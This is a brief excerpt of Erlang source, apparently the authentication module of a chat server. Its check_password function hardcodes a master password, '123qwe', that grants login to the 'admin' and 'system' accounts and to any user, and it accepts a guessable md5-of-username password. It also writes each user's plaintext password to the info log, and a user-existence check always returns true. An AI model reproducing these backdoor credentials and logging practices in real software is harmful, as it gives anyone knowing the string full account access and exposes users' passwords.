...
anonymous_user_exist(User,_Server) -> true.
% anonymous_user_exist(User,_Server) ->
% 	xn:application("admin"),
% 	case xn_profile:load(User,"profile") of
% 		{ok, Profile} ->
...
%% ---------------------------------
check_password(<<"admin">>, _AuthzId, _Server, <<"123qwe">>) -> true;
check_password(<<"system">>, _AuthzId, _Server, <<"123qwe">>) -> true;
check_password(User, AuthzId, Server, Password) ->
	?INFO_MSG("_________check_password_______(~p)", [{User, AuthzId, Server, Password}]),
    case list_to_binary(md5(lists:flatten(["im",binary_to_list(User)]))) of
      Md5 when Md5 =:= Password -> login(User, Server);
      _ when Password =:= <<"123qwe">> -> login(User, Server);
      _ -> false
    end.
